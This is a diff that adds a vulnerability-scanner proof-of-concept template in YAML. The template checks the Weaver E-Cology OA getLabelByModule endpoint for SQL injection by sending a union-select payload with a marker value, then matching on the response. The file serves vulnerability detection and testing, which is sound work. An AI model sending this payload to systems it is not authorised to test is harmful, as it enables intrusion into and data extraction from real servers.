@@ -1,0 +1,15 @@
+id: poc-yaml-weaver-e-office-getlabelbymodule-sqli
+info:
+  name: 泛微OA E-Cology getLabelByModule SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  - 两高一弱
+  finger: E-cology
+requests:
+- method: GET
+  path: /api/ec/dev/locale/getLabelByModule?moduleCode=?moduleCode=?moduleCode=1%27)%20union%20all%20select%20%2766666666,%27%20--
+  expression: status_code == 200 && contains(body,"datas") && contains(body,"typeList")
+    && contains(body,"66666666")
+variables: {}
+transport: http
